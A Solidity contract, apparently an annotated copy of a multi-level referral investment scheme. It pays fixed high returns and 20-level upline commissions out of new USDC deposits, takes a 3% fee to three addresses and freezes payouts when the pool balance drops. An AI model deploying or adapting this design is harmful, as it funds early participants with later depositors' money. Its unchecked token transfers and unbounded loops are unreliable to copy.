// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.6.12;

import "./SafeMath.sol";
import "./IERC20.sol";

contract DSG {
    using SafeMath for uint256; 
    IERC20 public usdc;
    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 300; 
    uint256 private constant minDeposit = 50e6;
    uint256 private constant maxDeposit = 2000e6;
    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant timeStep = 8 minutes;
    uint256 private constant dayPerCycle = 120 minutes; 
    uint256 private constant dayRewardPercents = 150;
    uint256 private constant maxAddFreeze = 360 minutes;
    uint256 private constant referDepth = 20;

    uint256 private constant directPercents = 500;
    uint256[2] private level2Percents = [100,200]; 
    uint256[2] private level3Percents = [200, 200];
    uint256[15] private level4And5Percents = [100, 100, 100, 100, 100, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50]; // Ruby, Diamond

    uint256 private constant diamondRoyaltyIncomePercent = 150;

    // ********************* Yet To Clarify
    uint256[5] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10];
    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    uint256[5] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10];
    mapping(uint256=>bool) public balStatus; // bal=>status
    // ********************* Yet to Clarify

    address[3] public feeReceivers;

    address public defaultRefer;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public royaltyPool;

    address[] public diamondPlayers;

    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    struct UserInfo {
        address referrer;
        uint256 start;
        uint256 level; // 0, 1, 2, 3, 4, 5
        uint256 maxDeposit; // Maximum Deposit of all time
        uint256 totalDeposit; 
        uint256 teamNum; // Downline Team Number
        uint256 maxDirectDeposit; 
        uint256 teamTotalDeposit;
        uint256 totalFreezed; // Total Freezed amount
        uint256 totalRevenue; // Whole static reward
    }

    mapping(address=>UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo{
        uint256 capitals; // Deposits
        uint256 statics; // Static Reward 22.5% for a cycle
        uint256 directs; 
        uint256 level2Rewards;
        uint256 level3Rewards;
        uint256 level4And5Left;
        uint256 level4And5Freezed;
        uint256 level4And5Released;
        uint256 royal;
        uint256 split;
        uint256 splitDebt;
    }

    mapping(address=>RewardInfo) public rewardInfo;
    
    bool public isFreezeReward; // --- Yet to Clarify

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor(address _usdcAddr, address _defaultRefer, address[3] memory _feeReceivers) public {
        usdc = IERC20(_usdcAddr);
        feeReceivers = _feeReceivers;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
    }

    // -------------------- Register Process

    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "Invalid Refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "Referrer Bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i=0; i < referDepth; i++) {
            if(upline != address(0)) {
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _callLevelNow(_user);
        if(levelNow > user.level) {
            user.level = levelNow;
            if(levelNow == 5) {
                diamondPlayers.push(_user);
            }
        }
    }

    function _callLevelNow(address _user) private view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;
        (uint256 maxTeam,  ,uint256 totalTeam) = getTeamDeposit(_user);

        if(total >= 2000e6 && user.teamNum >= 500 && maxTeam >= 50000e6 && totalTeam >= 500000e6) {
            levelNow = 5; // Diamond
        } else if(total >= 2000e6 && user.teamNum >= 200 && maxTeam >= 50000e6 && totalTeam >= 100000e6) {
            levelNow = 4; // Ruby
        } else if(total >= 1000e6 && user.teamNum >= 50 && maxTeam >= 5000e6 && totalTeam >= 10000e6) {
            levelNow = 3; // Gold
        } else if(total >= 200e6 && user.teamNum >= 5 && maxTeam >= 1500e6 && totalTeam >= 3000e6) {
            levelNow = 2; // Silver
        } else if(total >= 50e6) {
            levelNow = 1; // Newbie
        }

        return levelNow;
    }

    // ********************** Will Return Total Team, Max, Other Team Deposits
    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256) {
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;

        for(uint256 i=0; i<teamUsers[_user][0].length; i++) {
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam) {
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return (maxTeam, otherTeam, totalTeam);
    }

    // ----------------- Deposit Process, update Reward, Release Reward, Freeze Reward
    function deposit(uint256 _amount) external {
        usdc.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");

        if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
        }else if(user.maxDeposit < _amount){
            user.maxDeposit = _amount;
        }

        _updateTeamNum(_user);

        _distributeDeposit(_amount);

        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(msg.sender);

        // ----------- Freeze Amount Logic
        uint256 addFreeze = (orderInfos[_user].length).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount); // Unfreeze old deposits

        _distributeRoyaltyPool();

        _updateReferInfo(msg.sender, _amount);

        _updateReward(msg.sender, _amount);

        _releaseUpRewards(msg.sender, _amount);

        uint256 bal = usdc.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }

    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        usdc.transfer(feeReceivers[0], fee.div(3));
        usdc.transfer(feeReceivers[1], fee.div(3));
        usdc.transfer(feeReceivers[2], fee.div(3));
        uint256 royalty = _amount.mul(diamondRoyaltyIncomePercent).div(baseDivider);
        royaltyPool = royaltyPool.add(royalty);
    }

    // ---------------- To unfreeze previous deposits on every deposit if conditions met
    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        // Will run max time the orders Length
        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount){
                order.isUnfreezed = true;
                isUnfreezeCapital = true;

                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }

                _removeInvalidDeposit(_user, order.amount); // will remove the unfreezed amount from total team Deposit
                
                // ************************* yet to Clarify
                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider);
                if(isFreezeReward){
                    if(user.totalFreezed > user.totalRevenue){
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital){
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                // ************************* yet to Clarify

                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);

                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }

        // -------- agar amount > level5Freezed toh release the lvl5 Freezed amount
        if(!isUnfreezeCapital){ 
            RewardInfo storage userReward = rewardInfo[_user];
            if(userReward.level4And5Freezed > 0){
                uint256 release = _amount;
                if(_amount >= userReward.level4And5Freezed){
                    release = userReward.level4And5Freezed;
                }
                userReward.level4And5Freezed = userReward.level4And5Freezed.sub(release);
                userReward.level4And5Released = userReward.level4And5Released.add(release);
                user.totalRevenue = user.totalRevenue.add(release);
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _distributeRoyaltyPool() private {
        if(block.timestamp > lastDistribute.add(timeStep)){
            uint256 level5Count;
            for(uint256 i = 0; i < diamondPlayers.length; i++){
                if(userInfo[diamondPlayers[i]].level == 5){
                    level5Count = level5Count.add(1);
                }
            }

            if(level5Count > 0){
                uint256 reward = royaltyPool.div(level5Count);
                uint256 totalReward;
                for(uint256 i = 0; i < diamondPlayers.length; i++){
                    if(userInfo[diamondPlayers[i]].level == 5){
                        rewardInfo[diamondPlayers[i]].royal = rewardInfo[diamondPlayers[i]].royal.add(reward);
                        userInfo[diamondPlayers[i]].totalRevenue = userInfo[diamondPlayers[i]].totalRevenue.add(reward);
                        totalReward = totalReward.add(reward);
                    }
                }
                if(royaltyPool > totalReward){
                    royaltyPool = royaltyPool.sub(totalReward);
                }else{
                    royaltyPool = 0;
                }
            }

            lastDistribute = block.timestamp;
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;

                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }

                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;
                if(i > 4){
                    if(userInfo[upline].level > 3){
                        reward = newAmount.mul(level4And5Percents[i - 5]).div(baseDivider);
                        upRewards.level4And5Freezed = upRewards.level4And5Freezed.add(reward);
                    } 
                }else if(i > 2){
                    if( userInfo[upline].level > 2){
                        reward = newAmount.mul(level3Percents[i - 3]).div(baseDivider);
                        upRewards.level3Rewards = upRewards.level3Rewards.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    }
                } else if(i > 0) {
                    if(userInfo[upline].level > 1){
                        reward = newAmount.mul(level2Percents[i - 1]).div(baseDivider);
                        upRewards.level2Rewards = upRewards.level2Rewards.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    }
                }else{
                    reward = newAmount.mul(directPercents).div(baseDivider);
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;

            } else {
                break;
            }
        }
    }

    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function _releaseUpRewards(address _user, uint256 _amount) private { 
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                uint256 newAmount = _amount;
                if(upline != defaultRefer){
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if(maxFreezing < _amount){
                        newAmount = maxFreezing;
                    }
                }

                RewardInfo storage upRewards = rewardInfo[upline];

                // -------------------- Yet to Clarify
                if(i >= 5 && userInfo[upline].level > 3){
                    if(upRewards.level4And5Left > 0){
                        uint256 level4And5Reward = newAmount.mul(level4And5Percents[i - 5]).div(baseDivider);
                        if(level4And5Reward > upRewards.level4And5Left){ // --------------- Yet to Clarify
                            level4And5Reward = upRewards.level4And5Left;
                        }
                        upRewards.level4And5Left = upRewards.level4And5Left.sub(level4And5Reward); 
                        upRewards.level4And5Freezed = upRewards.level4And5Freezed.add(level4And5Reward);
                    }
                }
                // -------------------- Yet to Clarify
                
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _balActived(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    // --------- Yet to understand the purpose
    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }
    // ---------- Yet to understand the purpose

    // ----------------------- Split account
    function depositBySplit(uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender, _amount);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

    function getCurSplit(address _user) public view returns(uint256){
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    // ----------------------- Withdrawl Process
    function withdraw() external {
        _distributeRoyaltyPool();
        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);
        uint256 splitAmt = staticSplit;
        uint256 withdrawable = staticReward;

        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);

        userRewards.statics = 0;

        userRewards.directs = 0;
        userRewards.level4And5Released = 0;
        userRewards.level3Rewards = 0;
        userRewards.level2Rewards = 0;
        
        userRewards.royal = 0;
        
        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
        
        usdc.transfer(msg.sender, withdrawable);
        uint256 bal = usdc.balanceOf(address(this));
        _setFreezeReward(bal);

        emit Withdraw(msg.sender, withdrawable);
    }

    // ------------------- Calculate Rewards
    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.directs.add(userRewards.level4And5Released).add(userRewards.level3Rewards).add(userRewards.level2Rewards);
        totalRewards = totalRewards.add(userRewards.royal);
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    // ---------------------- Common Functions
    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getAllowance() public view returns(uint256) {
        uint256 allowance = usdc.allowance(msg.sender, address(this));
        return allowance;
    }

    function getOrdersLength(address _user) public view returns(uint256) {
        return orderInfos[_user].length;
    }

}